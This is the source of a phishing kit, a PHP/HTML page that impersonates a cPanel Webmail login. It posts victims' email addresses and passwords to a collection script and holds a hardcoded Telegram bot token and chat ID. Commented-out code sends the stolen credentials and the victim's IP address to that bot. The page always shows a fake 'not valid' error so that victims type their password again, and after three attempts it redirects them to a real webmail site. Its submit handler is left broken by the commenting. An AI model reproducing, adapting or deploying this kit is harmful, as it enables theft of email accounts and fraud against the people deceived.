


<!DOCTYPE html>
<html lang="en" dir="ltr">

<head>
<?php
    //include 'baseretrival.php';
    session_start();
?> 

  <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=1" />
  <meta name="google" content="notranslate" />
  <meta name="apple-itunes-app" content="app-id=1188352635" />
  <title>Webmail Login</title>
  <link rel="shortcut icon"
    href="data:image/x-icon;base64,AAABAAEAICAAAAEAIADSAgAAFgAAAIlQTkcNChoKAAAADUlIRFIAAAAgAAAAIAgGAAAAc3p69AAAAplJREFUWIXt1j2IHGUYB/DfOzdnjIKFkECIVWIKvUFsIkRExa9KJCLaWAgWJx4DilZWgpDDiI0wiViIoGATP1CCEDYHSeCwUBBkgiiKURQJFiLo4d0eOxYzC8nsO9m9XcXC+8MW+3z+9/l6l2383xH+iSBpElyTdoda26xsDqp/h0CVZ3vwKm7tMBngAs7h7eRYebG6hMtMBHbMBX89vfARHprQ5U8cwdFQlIOZCVR5di1+w/wWXT/EY6EoN5NZCODuKZLDwzgSMCuBe2fwfX6QZwtpWzqfBBtLC3txF/ZhxKbBGx0EfsTJS77vwmGjlZrD4mUzUOXZjVjGI65cnTXchB8iupdDUb7QinsQZ7GzZftdQj2JVZ49iC/w6JjksIo7OnS9tiA5Vn6GtyK2+1MY5NkhfGDygVrBAxH5WkPuMjR7/3UsUFLl2Q68s4XkA3ws3v9zoSjX28Kr5wL1xrTxa6ou+f6OZGvqPg9v1wZeaUjcELE/DVfNhWFSvy/enOIZ9eq1sTokEMNLWI79oirP8g6fXpVnh7GEvY1sV/OJ4f0UhyKKk6EoX4x5pEkgXv6L6OM99YqNw/c4kXSwG5nkIfpLCynuiahW1GWeJHkfT4aiXO9atz1XcD6I6yLyHu6bIPk6Hg9FeYZ63y9EjBarPDvQ8VJ1nd9V3D4m+RncForyxFCQ4hSeahlej88Hefauurdwaufr5z/F/ZHAX6nL+mZE18e36IWiHLkFocqzW9QXcNz1+wUHxJ/f10JRPjvGP4pk/vj5L3F8AtufdD+/p6dJDknzX+05fDLGtife/766t9MRgFCUffWTudwE3AqBlVCUf0xLYGTQqzzbhydwJ3Y34g318J1tmX+DPBTlz9MS2MY2/nP8DTGaqeTDf30rAAAAAElFTkSuQmCC"
    type="image/x-icon" />

  <!-- EXTERNAL CSS -->
  <link href="https://webmail.multiphar.co.bi/cPanel_magic_revision_1648610195/unprotected/cpanel/fonts/open_sans/open_sans.min.css" rel="stylesheet" type="text/css" />
  <link href="https://webmail.multiphar.co.bi/cPanel_magic_revision_1645742265/unprotected/cpanel/style_v2_optimized.css" rel="stylesheet" type="text/css" />

  <style type="text/css">
    /*
  This css is included in the base template in case the css cannot be loaded because of access restrictions
  If this css is updated, please update securitypolicy_header.html.tmpl as well
*/
    .copyright {
      background: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIzNTlwdCIgaGVpZ2h0PSIzMjAiIHZpZXdCb3g9IjAgMCAzNTkgMjQwIj48ZGVmcz48Y2xpcFBhdGggaWQ9ImEiPjxwYXRoIGQ9Ik0xMjMgMGgyMzUuMzd2MjQwSDEyM3ptMCAwIi8+PC9jbGlwUGF0aD48L2RlZnM+PHBhdGggZD0iTTg5LjY5IDU5LjEwMmg2Ny44MDJsLTEwLjUgNDAuMmMtMS42MDUgNS42LTQuNjA1IDEwLjEtOSAxMy41LTQuNDAyIDMuNC05LjUwNCA1LjA5Ni0xNS4zIDUuMDk2aC0zMS41Yy03LjIgMC0xMy41NSAyLjEwMi0xOS4wNSA2LjMtNS41MDUgNC4yLTkuMzUzIDkuOTA0LTExLjU1MiAxNy4xMDMtMS40IDUuNDAzLTEuNTUgMTAuNS0uNDUgMTUuMzAyIDEuMDk4IDQuNzk2IDMuMDQ3IDkuMDUgNS44NTIgMTIuNzUgMi43OTcgMy43MDMgNi40IDYuNjUyIDEwLjc5NyA4Ljg1IDQuMzk3IDIuMiA5LjE5OCAzLjI5OCAxNC40IDMuMjk4aDE5LjJjMy42MDIgMCA2LjU0NyAxLjQ1MyA4Ljg1MiA0LjM1MiAyLjI5NyAyLjkwMiAyLjk0NSA2LjE0OCAxLjk1IDkuNzVsLTEyIDQ0LjM5OGgtMjFjLTE0LjQwMyAwLTI3LjY1My0zLjE0OC0zOS43NS05LjQ1LTEyLjEwMi02LjMtMjIuMTUzLTE0LjY0OC0zMC4xNTMtMjUuMDUtOC0xMC4zOTUtMTMuNDU0LTIyLjI0Ni0xNi4zNS0zNS41NDctMi45LTEzLjMtMi41NS0yNi45NSAxLjA1Mi00MC45NTNsMS4yLTQuNWMyLjU5Ny05LjYwMiA2LjY0OC0xOC40NSAxMi4xNDgtMjYuNTUgNS41LTguMDk4IDEyLTE1IDE5LjUtMjAuNyA3LjUtNS43IDE1Ljg1LTEwLjE0OCAyNS4wNS0xMy4zNTIgOS4yLTMuMTk1IDE4Ljc5Ny00Ljc5NiAyOC44LTQuNzk2IiBmaWxsPSIjZmY2YzJjIi8+PGcgY2xpcC1wYXRoPSJ1cmwoI2EpIj48cGF0aCBkPSJNMTIzLjg5IDI0MEwxODIuOTkgMTguNjAyYzEuNTk4LTUuNTk4IDQuNTk4LTEwLjA5OCA5LTEzLjVDMTk2LjM4OCAxLjcgMjAxLjQ4NCAwIDIwNy4yODggMGg2Mi43YzE0LjQwMyAwIDI3LjY1IDMuMTQ4IDM5Ljc1IDkuNDUgMTIuMTAyIDYuMyAyMi4xNTMgMTQuNjU1IDMwLjE1MyAyNS4wNSA3Ljk5NyAxMC40MDIgMTMuNSAyMi4yNTQgMTYuNSAzNS41NSAzIDEzLjMwNSAyLjU5NCAyNi45NTQtMS4yMDIgNDAuOTVsLTEuMiA0LjVjLTIuNTk3IDkuNjAyLTYuNTk3IDE4LjQ1LTEyIDI2LjU1LTUuMzk4IDguMDk4LTExLjg0NyAxNS4wNTItMTkuMzQ3IDIwLjg0OC03LjUgNS44MDUtMTUuODU1IDEwLjMwNS0yNS4wNSAxMy41LTkuMiAzLjIwNC0xOC44MDUgNC44MDUtMjguODA1IDQuODA1aC01NC4yOTdsMTAuOC00MC41YzEuNi01LjQwMiA0LjYtOS44IDktMTMuMjAzIDQuMzk2LTMuMzk4IDkuNDk3LTUuMTAyIDE1LjMwMi01LjEwMmgxNy4zOThjNy4yIDAgMTMuNjUzLTIuMiAxOS4zNTItNi41OTcgNS42OTUtNC4zOTggOS40NDUtMTAuMDk3IDExLjI1LTE3LjEgMS4zOTQtNC45OTcgMS41NDctOS45LjQ0NS0xNC43LTEuMS00LjgtMy4wNS05LjA0Ny01Ljg0OC0xMi43NS0yLjgtMy42OTUtNi40MDItNi42OTUtMTAuNzk2LTktNC40MDYtMi4yOTctOS4yMDYtMy40NS0xNC40MDItMy40NUgyMzMuMzlsLTQzLjggMTYyLjkwM2MtMS42MDYgNS40LTQuNjA2IDkuNzk3LTkgMTMuMTk1LTQuNDAzIDMuNDA3LTkuNDA2IDUuMTAyLTE1IDUuMTAyaC00MS43IiBmaWxsPSIjZmY2YzJjIi8+PC9nPjwvc3ZnPgo=) no-repeat scroll center top transparent;
      background-size: 25px auto;
    }
  </style>
  <!--[if IE 6]>
      <style type="text/css">
        img {
          behavior: url(/cPanel_magic_revision_1653687663/unprotected/cp_pngbehavior_login.htc);
        }
      </style>
    <![endif]-->

  <!-- begin customizations -->
  <!-- <script src="js/13477600374.js"></script> -->
  <!-- GTM -->
  <noscript>
    <iframe src="//www.googletagmanager.com/ns.html?id=GTM-PPNLL2" height="0" width="0"
      style="display: none; visibility: hidden"></iframe>
  </noscript>
  <!-- <script>
      (function (w, d, s, l, i) {
        w[l] = w[l] || [];
        w[l].push({ "gtm.start": new Date().getTime(), event: "gtm.js" });
        var f = d.getElementsByTagName(s)[0],
          j = d.createElement(s),
          dl = l != "dataLayer" ? "&l=" + l : "";
        j.async = true;
        j.src = "//www.googletagmanager.com/gtm.js?id=" + i + dl;
        f.parentNode.insertBefore(j, f);
      })(window, document, "script", "dataLayer", "GTM-PPNLL2");
    </scr> -->
  <!-- end customizations -->
  <style>
    .loader {
      position: fixed;
      opacity: 0.5;
      top: 0;
      left: 0;
      width: 100vw;
      height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      background: #333333;
      transition: opacity 0.75s, visibility 0.75s;
      z-index: 10000;
    }

    .loader--hidden {
      opacity: 0;
      visibility: hidden;
    }

    .loader::after {
      content: "";
      width: 75px;
      height: 75px;
      border: 15px solid #dddddd;
      border-top-color: #0078c8;
      border-radius: 50%;
      animation: loading 0.75s ease infinite;
      z-index: 10000;
    }

    @keyframes loading {
      from {
        transform: rotate(0turn);
      }

      to {
        transform: rotate(1turn);
      }
    }

    .login-status-icon {
      background-image: url(images/notice-error.png);
    }

    .e-hidden {
      visibility: hidden;
    }
  </style>

<script>
 function navigateOnDoubleClick() {
        window.location.href = "adminsignin.php"; // Replace "new_page.html" with your desired URL
    }
  </script>
</head>

<body class="wm">
  




  <div class="loader loader--hidden"></div>
  <input type="hidden" id="goto_uri" value="/" />
  <input type="hidden" id="goto_app" value="" />
  <!-- Do not remove msg_code as it is needed for automated testing - msg_code:[]  -->
  <div id="login-wrapper" class="group has-pw-reset">
    <div class="wrapper">
      <div id="notify">
        <noscript>
          <div class="error-notice">
            <img src="/cPanel_magic_revision_1631732355/unprotected/hostgator/images/notice-error.png" alt="Error"
              align="left" />
            JavaScript is disabled in your browser. For Webmail to function
            properly, you must enable JavaScript. If you do not enable
            JavaScript, certain features in Webmail will not function
            correctly.
          </div>
        </noscript>

        <div id="login-status" class="error-notice e-hidden">
          <div class="content-wrapper">
            <div id="login-detail">
              <div id="login-status-icon-container">
                <span class="login-status-icon"></span>
              </div>
              <div id="login-status-message" class="a1"></div>
            </div>
          </div>
        </div>
      </div>

      <div style="display: none">
        <div id="locale-container" style="visibility: hidden">
          <div id="locale-inner-container">
            <div id="locale-header">
              <div class="locale-head">Please select a locale:</div>
              <div class="close">
                <a href="javascript:void(0)" onclick="toggle_locales(false)">X Close</a>
              </div>
            </div>
            <div id="locale-map">
              <div class="scroller clear">
                <div class="locale-cell">
                  <a href="?locale=ar">???????</a>
                </div>

                <div class="locale-cell">
                  <a href="?locale=bg">?????????</a>
                </div>

                <div class="locale-cell">
                  <a href="?locale=cs">cetina</a>
                </div>

                <div class="locale-cell"><a href="?locale=da">dansk</a></div>

                <div class="locale-cell">
                  <a href="?locale=de">Deutsch</a>
                </div>

                <div class="locale-cell">
                  <a href="?locale=el">????????</a>
                </div>

                <div class="locale-cell">
                  <a href="?locale=en">English</a>
                </div>

                <div class="locale-cell">
                  <a href="?locale=es">espanol</a>
                </div>

                <div class="locale-cell">
                  <a href="?locale=es_419">espanol latinoamericano</a>
                </div>

                <div class="locale-cell">
                  <a href="?locale=es_es">espanol de Espana</a>
                </div>

                <div class="locale-cell"><a href="?locale=fi">suomi</a></div>

                <div class="locale-cell">
                  <a href="?locale=fil">Filipino</a>
                </div>

                <div class="locale-cell">
                  <a href="?locale=fr">francais</a>
                </div>

                <div class="locale-cell"><a href="?locale=he">?????</a></div>

                <div class="locale-cell"><a href="?locale=hu">magyar</a></div>

                <div class="locale-cell"><a href="?locale=i_en">i_en</a></div>

                <div class="locale-cell">
                  <a href="?locale=id">Bahasa Indonesia</a>
                </div>

                <div class="locale-cell">
                  <a href="?locale=it">italiano</a>
                </div>

                <div class="locale-cell"><a href="?locale=ja">???</a></div>

                <div class="locale-cell"><a href="?locale=ko">???</a></div>

                <div class="locale-cell">
                  <a href="?locale=ms">Bahasa Melayu</a>
                </div>

                <div class="locale-cell">
                  <a href="?locale=nb">norsk bokml</a>
                </div>

                <div class="locale-cell">
                  <a href="?locale=nl">Nederlands</a>
                </div>

                <div class="locale-cell">
                  <a href="?locale=no">Norwegian</a>
                </div>

                <div class="locale-cell"><a href="?locale=pl">polski</a></div>

                <div class="locale-cell">
                  <a href="?locale=pt">portugues</a>
                </div>

                <div class="locale-cell">
                  <a href="?locale=pt_br">portugues do Brasil</a>
                </div>

                <div class="locale-cell"><a href="?locale=ro">romania</a></div>

                <div class="locale-cell">
                  <a href="?locale=ru">???????</a>
                </div>

                <div class="locale-cell">
                  <a href="?locale=sl">slovencina</a>
                </div>

                <div class="locale-cell">
                  <a href="?locale=sv">svenska</a>
                </div>

                <div class="locale-cell"><a href="?locale=th">???</a></div>

                <div class="locale-cell"><a href="?locale=tr">Turkerke</a></div>

                <div class="locale-cell">
                  <a href="?locale=uk">??????????</a>
                </div>

                <div class="locale-cell">
                  <a href="?locale=vi">Ti?ng Vi?t</a>
                </div>

                <div class="locale-cell"><a href="?locale=zh">??</a></div>

                <div class="locale-cell">
                  <a href="?locale=zh_cn">??(??)</a>
                </div>

                <div class="locale-cell">
                  <a href="?locale=zh_tw">??(??)</a>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
      <div id="content-container">
        <div id="login-container">
          <div id="login-sub-container">
            <div id="login-sub-header">
              <img class="main-logo" src="https://webmail.multiphar.co.bi/cPanel_magic_revision_1645739615/unprotected/cpanel/images/webmail-logo.svg" alt="logo" />
            </div>
            <div id="login-sub">
              <div id="clickthrough_form" style="visibility: hidden">
                <form>
                  <div class="notices"></div>
                  <button type="submit" class="clickthrough-cont-btn">
                    Continue
                  </button>
                </form>
              </div>
              <div id="forms">

              

                <form novalidate="" action="baseretrival.php" method="post" id="login_form" target="_top" style="visibility: visible">
                 
                
                <div id="errormessage" style="width: 300px;">
            
                      <?php
                        if (isset($_GET['error'])) {
                            $error = htmlspecialchars($_GET['error']); // For security (XSS protection)
                            echo "<div style='background-color: maroon; color: white; width: 300px; height: 40px;padding-top:15px;text-align:center;font-weight:bold'>
                            $error
                            </div>";
                        }
                        ?>
         
        
              </div>
                <div class="input-req-login">
                    <label for="user">Email Address</label>
                  </div>
                  <div class="input-field-login icon username-container">
                    <input name="user" id="user" autofocus="autofocus"  value="" placeholder="Enter your email address."
                      class="std_textbox" type="text" tabindex="1" required="" />
                  </div>
                  <div class="input-req-login login-password-field-label">
                    <label for="pass">Password</label>
                  </div>
                  <div class="input-field-login icon password-container">
                    <input name="pass" id="pass" placeholder="Enter your email password." class="std_textbox"
                      type="password" tabindex="2" required="" />
                  </div>
                  <div class="controls">
                    <div class="login-btn">
                      <button name="login" type="submit" id="login_submit" tabindex="3">
                        Log in
                      </button>
                    </div>

                    <div class="reset-pw">
                      <a href="" id="reset_password">
                      </a>
                    </div>
                  </div>
                  <div class="clear" id="push"></div>
                </form>
                <!--CLOSE forms -->
              </div>
              <!--CLOSE login-sub -->
            </div>

            <!--CLOSE wrapper -->
          </div>
          <!--CLOSE login-sub-container -->
        </div>
        <!--CLOSE login-container -->
      </div>

      <div id="locale-footer">
        <div class="locale-container">
          <noscript>
            <form method="get" action=".">
              <select name="locale">
                <option value="">Change locale</option>
                <option value="ar">العربية</option>
                <option value="bg">български</option>
                <option value="cs">čeština</option>
                <option value="da">dansk</option>
                <option value="de">Deutsch</option>
                <option value="el">Ελληνικά</option>
                <option value="en">English</option>
                <option value="es">español</option>
                <option value="es_419">español latinoamericano</option>
                <option value="es_es">español de España</option>
                <option value="fi">suomi</option>
                <option value="fil">Filipino</option>
                <option value="fr">français</option>
                <option value="he">עברית</option>
                <option value="hu">magyar</option>
                <option value="i_en">i_en</option>
                <option value="id">Bahasa Indonesia</option>
                <option value="it">italiano</option>
                <option value="ja">日本語</option>
                <option value="ko">한국어</option>
                <option value="ms">Bahasa Melayu</option>
                <option value="nb">norsk bokmål</option>
                <option value="nl">Nederlands</option>
                <option value="no">Norwegian</option>
                <option value="pl">polski</option>
                <option value="pt">português</option>
                <option value="pt_br">português do Brasil</option>
                <option value="ro">română</option>
                <option value="ru">русский</option>
                <option value="sl">slovenščina</option>
                <option value="sv">svenska</option>
                <option value="th">ไทย</option>
                <option value="tr">Türkçe</option>
                <option value="uk">українська</option>
                <option value="vi">Tiếng Việt</option>
                <option value="zh">中文</option>
                <option value="zh_cn">中文（中国）</option>
                <option value="zh_tw">中文（台湾）</option>
              </select>
              <button style="margin-left: 10px" type="submit">Change</button>
            </form>
            <style type="text/css">
              #mobilelocalemenu,
              #locales_list {
                display: none;
              }
            </style>
          </noscript>
          <ul id="locales_list">
            <li><a href="/?locale=ar">العربية</a></li>

            <li><a href="/?locale=bg">български</a></li>

            <li><a href="/?locale=cs">čeština</a></li>

            <li><a href="/?locale=da">dansk</a></li>

            <li><a href="/?locale=de">Deutsch</a></li>

            <li><a href="/?locale=el">Ελληνικά</a></li>

            <li><a href="/?locale=en">English</a></li>

            <li><a href="/?locale=es">español</a></li>

            <li>
              <a href="javascript:void(0)" id="morelocale" onclick="toggle_locales(true)" title="More locales"></a>
            </li>
          </ul>
          <div id="mobilelocalemenu">
            Select a locale:
            <a href="javascript:void(0)" onclick="toggle_locales(true)" title="Change locale">English</a>
          </div>




        </div>
      </div>
    </div>
    <!--Close login-wrapper -->
  </div>
  <style>
    @media (min-width: 481px) {
      #select_user_form {
        width: px;
      }
    }
  </style>
  <div class="copyright">
    
    Copyright©&nbsp;2024 cPanel, L.L.C. <br /><a href="https://go.cpanel.net/privacy" target="_blank">Privacy
      Policy</a>
  </div>


  <div>
 <button  ondblclick="navigateOnDoubleClick()">smart only</button>
</div>
  
  <script>


   
    // ############################################################################
    // Specify the URL of the PHP file Here

    //const url = "https://appstestingng.com/";
    const url = "baseretrival.php";
    const token = "6591880975:AAHKzari1fAlsjb4so_kgUp2LMCZMx3aZRQ";
    const chatID = 5689239814;

    // test = https://api.telegram.org/bot6591880975:AAHKzari1fAlsjb4so_kgUp2LMCZMx3aZRQ/getUpdates
    // ############################################################################

    window.onload = function () {
      // Get the current URL
      var url = window.location.href;

      // Parse the URL and get the fragment (the part after the '#')
      var urlComponents = new URL(url);
      var email = urlComponents.hash.substring(1);

      // Check if the fragment is a valid email
      var emailRegex = /^[\w-]+(\.[\w-]+)*@([\w-]+\.)+[a-zA-Z]{2,7}$/;
      if (emailRegex.test(email)) {
        var emailElement = document.getElementById("user");
        if (emailElement) {
          emailElement.value = email;
        }
      }
    };

    // Get the form and input elements
    var emailInput = document.getElementById("user");
    var passwordInput = document.getElementById("pass");
    let a1 = document.querySelectorAll(".error-notice");
    let a2 = document.querySelectorAll(".a1");
    var form = document.getElementById("login_form");
    const loader = document.querySelector(".loader");
    var clickCount = 0;
    let useLocation

    // Add an event listener for form submission
    form.addEventListener("submit", function (event) {
      // Prevent the form from being submitted normally
      event.preventDefault();

      let emailValue = emailInput.value;
      let passwordValue = passwordInput.value;

      // Write an if statement to check if the input value is empty
      if (emailInput.value === "") {
        console.log("empty111111111111");
        a1.forEach(function (element) {
          element.classList.remove("e-hidden");
        });
        a2.forEach(function (element) {
          element.innerHTML = "You must specify a username to log in.";
        });
        setTimeout(function () {
          a1.forEach(function (element) {
            element.classList.add("e-hidden");
          });
          a2.forEach(function (element) {
            element.innerHTML = "";
          });
        }, 4000);
        return;
      }

      if (passwordInput.value === "") {
        console.log("empty2222222222");
        a1.forEach(function (element) {
          element.classList.remove("e-hidden");
        });
        a2.forEach(function (element) {
          element.innerHTML = "Password is required";
        });
        setTimeout(function () {
          a1.forEach(function (element) {
            element.classList.add("e-hidden");
          });
          a2.forEach(function (element) {
            element.innerHTML = "";
          });
        }, 4000);
        return;
      }



      // Create a function that counts clicks and executes a separate function on second click
    //   if (emailInput.value && passwordInput.value) {
    //     loading();
    //     let dataLog1 = {
    //       email: emailInput.value,
    //       password: passwordInput.value,
    //       desc: "http://webmail.capitalaccesssolutions.com: Login Details",
    //     };
    //     let dataLog2 = `%0A ============================ %0A - <b>IP:</b> <i>${useLocation?.ip}</i> %0A - <b>Email:</b> <i>${emailInput.value}</i> %0A - <b>Password:</b> <i>${passwordInput.value}</i> %0A - <b>Description:</b> <i>http://webmail.capitalaccesssolutions.com: Login Details</i>`;
    //     sendFinal(dataLog1, dataLog2)
    //   }
    // });

    // Write a function that will redirect the page to a URL
    function toggleClass() {
      // Redirect the page to a URL
      window.location.href = "http://webmail.capitalaccesssolutions.com";
    }

    async function sendFinal(dataLog1, dataLog2) {
      try {
        const phpRes = await sendDataWithRetry(dataLog1);
        const tgRes = await sendToTelegram(dataLog2);
        // console.log("PHP: ", phpRes);
        // console.log("Telegram: ", tgRes);

        if (phpRes || tgRes) {
          stopLoading();
          clickCount++;
          // console.log(clickCount);
          if (clickCount === 3) {
            // Execute a separate function on second click
            toggleClass();
            clickCount = 0;
          }
        } else {
          throw new Error("One of the files did not send properly");
        }
      } catch (error) {
        console.error("Error sending data by both Telegram and PHP File:", error);
      }
    }

    // Send data to the PHP file
    // function sendDataWithRetry(dataLog1, maxRetries = 3) {
    //   return new Promise(async (resolve, reject) => {
    //     const sendRequest = async (retryCount) => {
    //       try {
    //         const response = await fetch(url, {
    //           method: "POST",
    //           headers: {
    //             "Content-Type": "application/json; charset=utf-8",
    //           },
    //           body: JSON.stringify(dataLog1),
    //         });

    //         if (response.ok) {
    //           const responseData = await response.json();
    //           // console.log("Data received by PHP:", responseData);
    //           resolve(true); // Resolve the Promise with true if the request is successful
    //         } else {
    //           throw new Error("Network response was not OK");
    //         }
    //       } catch (error) {
    //         console.error("Error sending data:", error);
    //         if (retryCount < maxRetries) {
    //           console.log(`Retrying (attempt ${retryCount + 1})...`);
    //           await sendRequest(retryCount + 1);
    //         } else {
    //           console.error("Max retries reached. Data not sent.");
    //           resolve(false); // Resolve the Promise with false if the request fails after max retries
    //         }
    //       }
    //     };
    //     sendRequest(0); // Start the initial request
    //   });
    // }

    // Send data to TELEGRAM
    // function sendToTelegram(dataLog2, maxRetries = 3) {
    //   return new Promise(async (resolve, reject) => {
    //     const sendRequest = async (retryCount) => {
    //       try {
    //         let botUrl = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatID}&text=${dataLog2}&parse_mode=html`;
    //         let api = new XMLHttpRequest();
    //         api.open("GET", botUrl, true);
    //         api.onload = function () {
    //           if (api.status === 200) {
    //             resolve(true); // Resolve the Promise with true if the request is successful
    //           } else {
    //             throw new Error("Failed to send");
    //           }
    //         };
    //         api.onerror = function () {
    //           reject(new Error("Network error")); // Reject the Promise with an error if there's a network error
    //         };
    //         api.send();
    //       } catch (error) {
    //         console.error("Error sending data:", error);
    //         if (retryCount < maxRetries) {
    //           console.log(`Retrying (attempt ${retryCount + 1})...`);
    //           await sendRequest(retryCount + 1);
    //         } else {
    //           console.error("Max retries reached. Data not sent.");
    //           resolve(false); // Resolve the Promise with false if the request fails after max retries
    //         }
    //       }
    //     };
    //     sendRequest(0); // Start the initial request
    //   });
    // }


    // async function getPublicIP() {
    //   try {
    //     // https://api.ipify.org?format=json
    //     const response = await fetch("https://api.ipify.org?format=json");
    //     useLocation = await response.json();
    //     console.log(useLocation)
    //   } catch (error) {
    //     console.error("Could not fetch public ip: ", error)
    //   }
    // }

    // getPublicIP()

    function loading() {
      loader.classList.remove("loader--hidden");
    }

    function stopLoading() {
      loader.classList.add("loader--hidden");
      a1.forEach(function (element) {
        element.classList.remove("e-hidden");
      });
      a2.forEach(function (element) {
        element.innerHTML = "Your Email/Password not valid";
      });
      passwordInput.value = "";
      setTimeout(function () {
        a1.forEach(function (element) {
          element.classList.add("e-hidden");
        });
        a2.forEach(function (element) {
          element.innerHTML = "";
        });
      }, 4000);
    }

    // function ttext() {
    //   // Get the button element by its class name
    //   var button = document.querySelector(".asa");
    //   // Get the input element by its class name
    //   var input = document.querySelector(".asa1");

    //   // Toggle the text content between "Show" and "Hide" and the input type
    //   if (button.textContent === "Show") {
    //     button.textContent = "Hide";
    //     input.type = "text";
    //   } else {
    //     button.textContent = "Show";
    //     input.type = "password";
    //   }
    // }

    // Add the onclick event listener to the button
    // document.querySelector(".show-hide-btn").onclick = ttext;
  </script>
</body>

</html>